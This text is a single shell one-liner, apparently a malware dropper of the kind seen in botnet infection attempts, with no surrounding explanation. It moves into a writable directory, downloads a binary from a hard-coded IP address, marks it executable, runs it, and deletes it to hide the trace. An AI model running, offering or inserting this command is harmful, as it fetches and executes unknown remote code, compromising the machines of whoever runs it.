cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.203.88.179/wget; chmod +x wget; ./wget; rm -rf wget
